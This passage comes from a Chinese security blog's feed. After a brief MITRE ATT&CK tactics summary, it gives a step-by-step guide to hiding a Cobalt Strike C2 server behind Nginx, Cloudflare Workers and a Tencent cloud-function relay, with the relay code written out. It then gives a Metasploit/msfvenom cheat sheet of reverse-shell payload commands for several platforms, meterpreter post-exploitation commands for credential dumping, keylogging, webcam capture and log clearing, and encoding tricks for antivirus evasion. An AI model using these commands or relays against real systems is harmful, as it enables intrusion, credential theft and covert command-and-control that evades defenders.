Access</a>:<strong>凭据访问</strong></h2><p>对手试图窃取帐户名和密码。</p><p>凭据访问包括窃取凭据（如帐户名和密码）的技术。用于获取凭据的技术包括键盘记录或凭据转储。使用合法凭证可以让攻击者访问系统，使他们更难被发现，并提供创建更多帐户以帮助实现其目标的机会。</p><h2 id="10-Discovery-发现"><a href="#10-Discovery-发现" class="headerlink" title="10.Discovery:发现"></a>10.<a href="https://attack.mitre.org/tactics/TA0007">Discovery</a>:<strong>发现</strong></h2><p>对手试图找出你的环境。</p><p>发现包括攻击者可能用来获取有关系统和内部网络的知识的技术。这些技术可帮助对手在决定如何行动之前观察环境并确定自己的方向。它们还允许对手探索他们可以控制的内容以及他们的切入点周围的内容，以发现它如何有利于他们当前的目标。本机操作系统工具通常用于实现此妥协后的信息收集目标。</p><h2 id="11-Lateral-Movement-横向移动"><a href="#11-Lateral-Movement-横向移动" class="headerlink" title="11.Lateral Movement:横向移动"></a>11.<a href="https://attack.mitre.org/tactics/TA0008">Lateral Movement</a>:<strong>横向移动</strong></h2><p>对手正试图穿越您的环境。</p><p>横向移动由攻击者用来进入和控制网络上的远程系统的技术组成。完成他们的主要目标通常需要探索网络以找到他们的目标，然后才能访问它。实现他们的目标通常需要通过多个系统和帐户来获取收益。攻击者可能会安装自己的远程访问工具来完成横向移动，或者使用合法凭据与本机网络和操作系统工具配合使用，这可能会更加隐蔽。</p><h2 id="12-Collection-收集"><a href="#12-Collection-收集" class="headerlink" title="12.Collection:收集"></a>12.<a href="https://attack.mitre.org/tactics/TA0009">Collection</a>:<strong>收集</strong></h2><p>对手正试图收集对其目标感兴趣的数据。</p><p>收集包括对手可能用来收集信息的技术，并且收集的信息来源与跟踪对手的目标有关。通常，收集数据后的下一个目标是窃取（泄露）数据。常见的目标源包括各种驱动器类型、浏览器、音频、视频和电子邮件。常见的采集方式包括截屏和键盘输入。</p><h2 id="13-Command-and-Control-命令与控制"><a href="#13-Command-and-Control-命令与控制" class="headerlink" title="13.Command and Control:命令与控制"></a>13.<a href="https://attack.mitre.org/tactics/TA0011">Command and Control</a>:<strong>命令与控制</strong></h2><p>对手正试图与受感染的系统通信以控制它们。</p><p>命令和控制由攻击者用来与受害网络中受其控制的系统通信的技术组成。攻击者通常试图模仿正常的、预期的流量以避免检测。根据受害者的网络结构和防御，攻击者可以通过多种方式建立具有各种隐身级别的指挥和控制。</p><h2 id="14-Exfiltration-数据回传"><a href="#14-Exfiltration-数据回传" class="headerlink" title="14.Exfiltration:数据回传"></a>14.<a href="https://attack.mitre.org/tactics/TA0010">Exfiltration</a>:<strong>数据回传</strong></h2><p>对手正试图窃取数据。</p><p>渗透包括攻击者可能用来从您的网络窃取数据的技术。一旦收集到数据，攻击者通常会将其打包以避免在删除时被发现。这可以包括压缩和加密。从目标网络获取数据的技术通常包括通过其命令和控制通道或备用通道传输数据，还可能包括对传输设置大小限制。</p><h2 id="15-Impact-影响"><a href="#15-Impact-影响" class="headerlink" title="15.Impact:影响"></a>15.<a href="https://attack.mitre.org/tactics/TA0040">Impact</a>:<strong>影响</strong></h2><p>对手试图操纵、中断或破坏您的系统和数据。</p><p>影响包括攻击者用来通过操纵业务和操作流程来破坏可用性或破坏完整性的技术。用于影响的技术可能包括破坏或篡改数据。在某些情况下，业务流程看起来不错，但可能已被更改以使对手的目标受益。攻击者可能会使用这些技术来实现其最终目标或为泄露机密提供掩护。</p>]]></content>
      
      
      
        <tags>
            
            <tag> APT </tag>
            
            <tag> MITRE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS隐藏篇</title>
      <link href="/2021/11/29/cs-yin-cang-pian/"/>
      <url>/2021/11/29/cs-yin-cang-pian/</url>
      
        <content type="html"><![CDATA[<p>近期工作频繁用到cs，于是向古月大表哥要了一份CS隐藏教程，再结合一些其他教程，操作了一把。</p><h2 id="1-修改默认端口"><a href="#1-修改默认端口" class="headerlink" title="1.修改默认端口"></a>1.修改默认端口</h2><p>修改cs 默认端口，修改方法比较简单，直接修改 teamserver 文件中<code>cobaltstrike.server_port </code> 参数即可</p><h2 id="2-替换默认证书"><a href="#2-替换默认证书" class="headerlink" title="2.替换默认证书"></a>2.替换默认证书</h2><p>CS启动后，会使用默认的keystore，该证书直接将 cs 相关字样写在证书信息中，因此需要我们自己创建一个自定义的keystore，防止资产探测及其他平台对IP进行打标</p><pre class="language-none"><code class="language-none">#使用keytool生成自定义证书，执行后，需要设置证书密码keytool -keystore cobaltstrike.store -storepass sslvpn -keypass sslvpn -genkey -keyalg RSA -alias baidu.com -dname "CN=(ZhongGuo), OU=(EE), O=(CF), L=(BeiJing), ST=(HaiDian), C=(CN)"#查看生成的自定义证书信息keytool -list -v -keystore CobaltStrike.store</code></pre><p>修改 teamserver 文件中keystore的密码为我们刚刚设置的密码</p><pre class="language-bash" data-language="bash"><code class="language-bash">java -XX:ParallelGCThreads<span class="token operator">=</span><span class="token number">4</span> -Dcobaltstrike.server_port<span class="token operator">=</span>自定义端口 -Djavax.net.ssl.keyStore<span class="token operator">=</span>./cobaltstrike.store -Djavax.net.ssl.keyStorePassword<span class="token operator">=</span>证书密码 -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar server.TeamServer <span class="token variable">$*</span></code></pre><h2 id="3-使用Nginx做反代"><a href="#3-使用Nginx做反代" class="headerlink" title="3.使用Nginx做反代"></a>3.使用Nginx做反代</h2><p>以上两步操作，主要是用于隐藏 cs自己启动的端口信息，防止被外部资产探测平台标记。</p><p>使用Nginx反代，是为了防止我们创建的 监听器 被探测到并被标记（beacon）。此处也可以通过反编译cs代码，修改相关逻辑，防止被探测识别。可参考文章：<a href="https://cloud.tencent.com/developer/article/1764340">https://cloud.tencent.com/developer/article/1764340</a></p><p>为了简单，此处使用了 防火墙+Nginx 反代的操作进行隐藏，以下为详细步骤：</p><h3 id="iptables禁止外部访问"><a href="#iptables禁止外部访问" class="headerlink" title="iptables禁止外部访问"></a>iptables禁止外部访问</h3><p>首先，假设我们将 https的监听端口放在44321，如下创建监听器</p><img src="/assets/image-20211129101509628.png" alt="image-20211129101509628" style="zoom:67%;"><p>创建完成后，使用iptables对该端口限制只能 127.0.0.1 访问</p><pre class="language-bash" data-language="bash"><code class="language-bash">iptables -AINPUT -s <span class="token number">127.0</span>.0.1 -ptcp --dport <span class="token number">44321</span> -j ACCEPTiptables -AINPUT -ptcp --dport <span class="token number">44321</span> -j DROP</code></pre><h4 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h4><p>首先安装Nginx，安装后，默认配置应当在 /etc/nginx 下。</p><pre class="language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> nginx</code></pre><p>安装完成后，为了使用https，我们可以自签或者申请免费的https证书。 由于后续使用了cloudflare cdn，cloudflare 直接替我们申请了https 证书。此处记录自签名证书生成过程</p><p>生成key 和 crt 文件，放置在Nginx配置目录</p><pre class="language-none"><code class="language-none">openssl genrsa -out ca.key 2048openssl req -new -x509 -key ca.key -out server.crt -days 365</code></pre><p>修改Nginx配置，此处 监听在443端口，并且通过 user-agent 参数对访问源进行屏蔽（当前使用的jQuery profile，下文会将如何修改profile文件，此处可按实际情况修改）。</p><p>为了 CS 能够获取到 客户端真实IP，添加 <code>proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</code> </p><pre class="language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">{</span>  <span class="token directive"><span class="token keyword">listen</span> <span class="token number">443</span></span><span class="token punctuation">;</span>  <span class="token directive"><span class="token keyword">server_name</span>  _</span><span class="token punctuation">;</span>  <span class="token directive"><span class="token keyword">ssl</span> <span class="token boolean">on</span></span><span class="token punctuation">;</span>  <span class="token directive"><span class="token keyword">ssl_certificate</span>   ./server.crt</span><span class="token punctuation">;</span>  <span class="token directive"><span class="token keyword">ssl_certificate_key</span>  ./ca.key</span><span class="token punctuation">;</span>  <span class="token directive"><span class="token keyword">ssl_session_timeout</span> <span class="token number">5m</span></span><span class="token punctuation">;</span>  <span class="token directive"><span class="token keyword">ssl_protocols</span> TLSv1 TLSv1.1 TLSv1.2</span><span class="token punctuation">;</span>  <span class="token comment">#set_real_ip_from 0.0.0.0/0;</span>  <span class="token comment">#real_ip_header CF-Connecting-IP;</span>  <span class="token directive"><span class="token keyword">location</span> ~*</span> <span class="token punctuation">{</span>    <span class="token directive"><span class="token keyword">if</span> (<span class="token variable">$http_user_agent</span> != <span class="token string">"你的jQuery profile配置文件中的UA"</span>)</span> <span class="token punctuation">{</span>    <span class="token directive"><span class="token keyword">proxy_pass</span>          http://127.0.0.1:12345</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">#proxy_set_header X-Real-IP $remote_addr;</span>    <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span></span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">proxy_pass</span>          https://127.0.0.1:44321</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>到这一步，生成相关的木马，应当是可以正常上线的。</p><p>但当前也还存在着一些问题，如证书不可信（此处Nginx使用免费的，受信任的证书）、域名暴露、IP暴露、域名信誉度低等。</p><h2 id="4-cloudflare-CDN"><a href="#4-cloudflare-CDN" class="headerlink" title="4.cloudflare CDN"></a>4.cloudflare CDN</h2><p>使用CDN可以隐藏真实IP，cloudflare 注册及启用cdn不再此介绍，可参考另一篇文章 <a href="https://aspirepig.github.io/2021/11/23/wordpress-qian-yi-hexo/">https://aspirepig.github.io/2021/11/23/wordpress-qian-yi-hexo/</a> 中第六部分 <strong>6.使用 cloudflare 免费CDN加速访问（可选）</strong></p><p>配置完成后，此处我们配置禁用缓存，防止产生某些回连问题。</p><p>在规则页面，点击创建页面规则，创建完成后如下</p><p><img src="/assets/image-20211129104215784.png" alt="image-20211129104215784"></p><h2 id="5-cloudflare-云函数"><a href="#5-cloudflare-云函数" class="headerlink" title="5.cloudflare 云函数"></a>5.cloudflare 云函数</h2><p>cloudflare 有一个workers，可使用JavaScript语言实现自定义函数，免费用户每天有10万的请求量。</p><p><img src="/assets/image-20211129103521015.png" alt="image-20211129103521015"></p><p>点击create service</p><img src="/assets/image-20211129103557801.png" alt="image-20211129103557801" style="zoom:67%;"><p>输入我们想要自定义的域名，选择 http handler</p><img src="/assets/image-20211129103655311.png" alt="image-20211129103655311" style="zoom:67%;"><p>创建 service，然后点击快速编辑，输入自定义代码，修改其中的上游地址</p><pre class="language-none"><code class="language-none">let upstream = 'https://cdn.xxxx.xx'addEventListener('fetch', event =&gt; {    event.respondWith(fetchAndApply(event.request));})async function fetchAndApply(request) {    constipAddress = request.headers.get('cf-connecting-ip') || '';    let requestURL = newURL(request.url);    let upstreamURL = newURL(upstream);    requestURL.protocol = upstreamURL.protocol;    requestURL.host = upstreamURL.host;    requestURL.pathname = upstreamURL.pathname + requestURL.pathname;let new_request_headers = newHeaders(request.headers);    new_request_headers.set("X-Forwarded-For", ipAddress);    let fetchedResponse = await fetch(        newRequest(requestURL, {            method: request.method,            headers: new_request_headers,            body: request.body        })    );    let modifiedResponseHeaders = newHeaders(fetchedResponse.headers);    modifiedResponseHeaders.delete('set-cookie');    returnnewResponse(        fetchedResponse.body,        {            headers: modifiedResponseHeaders,            status: fetchedResponse.status,            statusText: fetchedResponse.statusText        }    );}</code></pre><h2 id="6-修改profile文件"><a href="#6-修改profile文件" class="headerlink" title="6.修改profile文件"></a>6.修改profile文件</h2><p>profile文件中，可以自定义交互的payload，自定义参数等，具体修改此处不做记录。可参考以下两个仓库：</p><pre class="language-none"><code class="language-none">https://github.com/threatexpress/malleable-c2  #jQuery profilehttps://github.com/rsmudge/Malleable-C2-Profiles</code></pre><p>假设使用 jQuery 文件，服务端启动命令如下</p><pre class="language-none"><code class="language-none">./teamserver.sh ip password jquery.profile</code></pre><hr><p>附 <a href="/assets/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">CobaltStrike4.0用户手册_中文翻译</a></p><p>DNS 上线配置方法：</p><p><img src="/assets/image-20211129161253595.png" alt="image-20211129161253595"></p><p>cs中监听器对应配置如下，都写ns记录的值：</p><p><img src="/assets/image-20211129161035273.png" alt="image-20211129161035273"></p><h2 id="腾讯云云函数创建："><a href="#腾讯云云函数创建：" class="headerlink" title="腾讯云云函数创建："></a>腾讯云云函数创建：</h2><p>前往页面 <a href="https://console.cloud.tencent.com/scf/list?rid=1&amp;ns=default%EF%BC%8C%E7%82%B9%E5%87%BB%E6%96%B0%E5%BB%BA">https://console.cloud.tencent.com/scf/list?rid=1&amp;ns=default，点击新建</a></p><p><img src="/assets/image-20211130161918062.png" alt="image-20211130161918062"></p><p>腾讯云函数创建时，需要选择函数类型，大致区别如下：</p><ul><li>事件函数：通过多种触发器，接收json格式触发执行，适合单个任务(模板简洁)</li><li>WEB函数：通过接收HTTP 请求触发，适用于WEB服务（模板为完整的框架）。</li></ul><p>此处选择 事件函数，便于后面替换代码。</p><p>函数代码放入：</p><p>😭这里踩了好久的坑，我用的jQuery profile，会通过URL传递参数，然而网上给出的代码都对 url参数就行处理，导致url参数掉了，一直无法正常回传数据</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf8 -*-</span><span class="token keyword">import</span> json<span class="token punctuation">,</span>base64<span class="token punctuation">,</span>requests<span class="token keyword">def</span> <span class="token function">main_handler</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    C2 <span class="token operator">=</span> <span class="token string">'http://IP:PORT'</span>    headers <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token string">'headers'</span><span class="token punctuation">]</span>    param <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token string">'queryString'</span><span class="token punctuation">]</span>    path <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span>    ip <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token string">'requestContext'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sourceIp'</span><span class="token punctuation">]</span>    headers <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token string">'headers'</span><span class="token punctuation">]</span>    headers<span class="token punctuation">[</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">]</span> <span class="token operator">=</span> ip    <span class="token keyword">print</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span>    <span class="token keyword">if</span> event<span class="token punctuation">[</span><span class="token string">'httpMethod'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>C2<span class="token operator">+</span>path<span class="token punctuation">,</span>params<span class="token operator">=</span>para_data<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>C2<span class="token operator">+</span>path<span class="token punctuation">,</span>params<span class="token operator">=</span>para_data<span class="token punctuation">,</span>data<span class="token operator">=</span>event<span class="token punctuation">[</span><span class="token string">'body'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>content<span class="token punctuation">)</span>    response<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">"isBase64Encoded"</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span>        <span class="token string">"statusCode"</span><span class="token punctuation">:</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span>        <span class="token string">"headers"</span><span class="token punctuation">:</span><span class="token builtin">dict</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"body"</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> response</code></pre><p>创建完成后，点击 <strong>触发管理</strong>，创建 API网关触发器</p><p>API网关触发器包含两种：集成响应与透传响应，具体区别可看 <a href="https://cloud.tencent.com/document/product/583/12513">API网关触发器概述</a></p><p><img src="/assets/image-20211130143935222.png" alt="image-20211130143935222"></p><p>创建完成后，进入API网关管理界面，选择刚创建的网关，点击服务名进入服务详情，再点击编辑</p><p><a href="https://console.cloud.tencent.com/apigateway/service?rid=1">https://console.cloud.tencent.com/apigateway/service?rid=1</a></p><p><img src="/assets/image-20211130144419578.png" alt="image-20211130144419578"></p><p>将路径改为  <code>/</code>,保存后将会获得分配的域名</p><p><img src="/assets/image-20211130144945864.png" alt="image-20211130144945864"></p><p>使用该域名生成木马即可</p><p><img src="/assets/image-20211130151232951.png" alt="image-20211130151232951"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.cnblogs.com/Xy--1/p/14396744.html">https://www.cnblogs.com/Xy--1/p/14396744.html</a></li><li><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></li></ul><p>TODO：</p><ul><li><input checked="" disabled="" type="checkbox"> 腾讯云 云函数</li><li><input disabled="" type="checkbox"> 定制profile文件</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>msf &amp; msfvenom 常用命令</title>
      <link href="/2021/11/24/msf-chang-yong-ming-ling/"/>
      <url>/2021/11/24/msf-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span>   进程sysinfo 查看系统信息route 查看路由表run get_local_subnets 获得内网 <span class="token function">ip</span> 段情况getwd/getpid/getuid 查看路径/shell id/当前用户getsystem 一键提权screenshot 截屏background/sessions 配合upload/download /root/test  c:<span class="token punctuation">\</span><span class="token punctuation">\</span>   上传/下载文件search -D c:<span class="token punctuation">\</span><span class="token punctuation">\</span> -f *.doc   -D 指定目录 –f 指定文件edit 相当于vi 修改host等run getgui -e 开启目标主机远程桌面run getgui -u example_username -p example_password 可以添加账号以便利用run arp_scanner -r x.x.x.x/24 扫描存活主机 linux下也可以fping   -asg   <span class="token number">10.96</span>.10.0/24  或namprun service_manager –l 获取运行服务rdesktop -u kali -p meterpreter <span class="token number">192.168</span>.250.176:3389远程左面连接 shell 获取cmdkeyscan_start/dump/stop 开启/输出/关闭 记录目标主机的键盘输入run hashdump 打印账号密码hash<span class="token operator">&amp;</span><span class="token comment">#xff0c;这个并不好&amp;#xff0c;可以利用mimikatz</span>load mimikatz先migrate PID然后load mimikatz获取密码mimikatz_command -f sekurlsa::searchPasswords也可以上传一个execute -i -f mimikatz.exeprivilege::debug 提权sekurlsa::logonpasswords获取密码portfwd命令 端口转发 portfwd <span class="token function">add</span> -l <span class="token number">1122</span> -p <span class="token number">3389</span> -r <span class="token number">192.168</span>.250.176migrate 端口 讲meterprete注入进程种结合ps使用execute –f 相当于cmd中执行命令 –H 后台执行 –i交互式 假冒域管理员等<span class="token operator">&amp;</span><span class="token comment">#xff0c;use incognito然后查看list_tokens –u存在用户名 假冒impersonate_token 用户名(\\两个)</span>record_mic 记录麦克风•  webcam_list 查看摄像头设备•  从指定的摄像头<span class="token operator">&amp;</span><span class="token comment">#xff0c;拍摄照片&amp;#xff1a;webcam_snap  webcam_snap -i 1 -v false 每隔一秒拍摄一张图片</span>•  从指定的摄像头<span class="token operator">&amp;</span><span class="token comment">#xff0c;开启视频&amp;#xff1a;webcam_stream</span>run post/windows/gather/enum_applications  获取目标主机上的软件安装信息run post/windows/gather/enum_ie  读取IE 浏览器cookies 等缓存信息。run post/windows/gather/dumplinks 最近打开文档run post/windows/gather/checkvm  是否虚拟机clearev 清除痕迹</code></pre><h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><pre class="language-none"><code class="language-none">添加命令：route  add  内网ip  子网掩码   session的id打印命令：route  print</code></pre><h3 id="扫描内网"><a href="#扫描内网" class="headerlink" title="扫描内网"></a>扫描内网</h3><pre class="language-none"><code class="language-none">use auxiliary/scanner/portscan/tcp</code></pre><h3 id="创建快捷脚本"><a href="#创建快捷脚本" class="headerlink" title="创建快捷脚本"></a>创建快捷脚本</h3><pre class="language-none"><code class="language-none">makerc &lt;name&gt;</code></pre><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><pre class="language-none"><code class="language-none">portfwd add -l 2222 -r 192.168 -p 3389  </code></pre><h3 id="使用其他协议反弹shell"><a href="#使用其他协议反弹shell" class="headerlink" title="使用其他协议反弹shell"></a>使用其他协议反弹shell</h3><pre class="language-none"><code class="language-none">use  windows/local/payload_inject</code></pre><h3 id="pivot-socks5代理"><a href="#pivot-socks5代理" class="headerlink" title="pivot + socks5代理"></a>pivot + socks5代理</h3><pre class="language-none"><code class="language-none">route add 10.10.10.1 255.255.255.0 1route printuse auxiliary/server/socks_proxy show optionsrun</code></pre><h3 id="Socks5代理"><a href="#Socks5代理" class="headerlink" title="Socks5代理"></a>Socks5代理</h3><pre class="language-none"><code class="language-none">export ALL_PROXY=socks5://127.0.0.1:1080</code></pre><h3 id="自动迁移"><a href="#自动迁移" class="headerlink" title="自动迁移"></a>自动迁移</h3><pre class="language-none"><code class="language-none">set AutoRunScript migrate -f  自动迁移进程</code></pre><h3 id="Handlers"><a href="#Handlers" class="headerlink" title="Handlers"></a>Handlers</h3><p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</p><pre class="language-command_linux" data-language="command_linux"><code class="language-command_linux">use exploit/multi/handlerset PAYLOAD &lt;Payload name&gt;set LHOST &lt;LHOST value&gt;set LPORT &lt;LPORT value&gt;set ExitOnSession falseexploit -j -z  #后台持续监听</code></pre><p>Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘</p><p>同样，快捷启动</p><pre class="language-none"><code class="language-none">msfconsole -x "use exploits/multi/handler; set lhost IP; set lport 7777; set payload windows/x64/meterpreter/reverse_tcp_rc4;set RC4PASSWORD password; exploit"</code></pre><h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><h3 id="命令选项"><a href="#命令选项" class="headerlink" title="命令选项"></a>命令选项</h3><pre class="language-none"><code class="language-none">Options:-p, --payload 指定需要使用的payload。使用自定义的payload，请使用-;或者stdin指定-l, --list  列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all-n, --nopsled 为payload预先指定一个NOP滑动长度-f, --format  指定输出格式-e, --encoder 指定需要使用的编码-a, --arch 指定payload的目标架构 x64 x86–platform 指定payload的目标平台-s, --space 设定有效攻击荷载的最大长度-b, --bad-chars 设定规避字符集&amp;#xff0c;比如: &amp;#039;\x00\xff&amp;#039;-i, --iterations 指定payload的编码次数，绕杀毒-c, --add-code 指定一个附加的win32 shellcode文件-x, --template  指定一个自定义的可执行文件作为模板-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行–payload-options 列举payload的标准选项-o, --out  保存payload-v, --var-name 指定一个自定义的变量，以确定输出格式–shellest 最小化生成payload</code></pre><h3 id="Binaries"><a href="#Binaries" class="headerlink" title="Binaries"></a>Binaries</h3><p>Linux</p><pre class="language-none"><code class="language-none">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></pre><p>Windows</p><pre class="language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></pre><p>Mac</p><pre class="language-none"><code class="language-none">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></pre><h3 id="Web-Payloads"><a href="#Web-Payloads" class="headerlink" title="Web Payloads"></a>Web Payloads</h3><p>PHP</p><pre class="language-none"><code class="language-none">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></pre><p>ASP</p><pre class="language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></pre><p>JSP</p><pre class="language-none"><code class="language-none">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></pre><p>WAR</p><pre class="language-none"><code class="language-none">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></pre><h3 id="Scripting-Payloads"><a href="#Scripting-Payloads" class="headerlink" title="Scripting Payloads"></a>Scripting Payloads</h3><p>Python</p><pre class="language-none"><code class="language-none">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code></pre><p>Bash</p><pre class="language-none"><code class="language-none">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code></pre><p>Perl</p><pre class="language-none"><code class="language-none">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></pre><h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><p>For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</p><p>Linux Based Shellcode</p><pre class="language-none"><code class="language-none">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></pre><p>Windows Based Shellcode</p><pre class="language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></pre><p>Mac Based Shellcode</p><pre class="language-none"><code class="language-none">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></pre><h2 id="木马免杀"><a href="#木马免杀" class="headerlink" title="木马免杀"></a>木马免杀</h2><h3 id="流量混淆"><a href="#流量混淆" class="headerlink" title="流量混淆"></a>流量混淆</h3><p>dns C2</p><pre class="language-none"><code class="language-none">待完善</code></pre><p>https加密（可配合 cloudflare cdn使用，隐藏真实IP）</p><pre class="language-none"><code class="language-none">Cloudflare支持的HTTP端口是：80,8080,8880,2052,2082,2086,2095Cloudflare支持的HTTPs端口是：443,2053,2083,2087,2096,8443</code></pre><p>命令示例</p><pre class="language-none"><code class="language-none">msfvenom -p windows/x64/meterpreter/reverse_https  LHOST=IP LPORT=443  -f exe -o rc4_7777.exe</code></pre><p>tcp协议 通过rc4加密</p><pre class="language-none"><code class="language-none">msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=set  LHOST=IP LPORT=7777  -f exe -o rc4_7777.exe</code></pre><h3 id="木马混淆"><a href="#木马混淆" class="headerlink" title="木马混淆"></a>木马混淆</h3><p>编码处理</p><pre class="language-none"><code class="language-none">msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt; -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;msfvenom -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -i 8 -b ‘\x00’ LHOST=192.168.1.48 LPORT=8080  -f raw -o /root/Desktop/Green_m.raw</code></pre><p>导出 C代码，通过掩日生成exe免杀</p><pre class="language-none"><code class="language-none">msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=password  LHOST=IP LPORT=7777  -f c -o shell.c</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> msfvenom </tag>
            
        </tags>
      
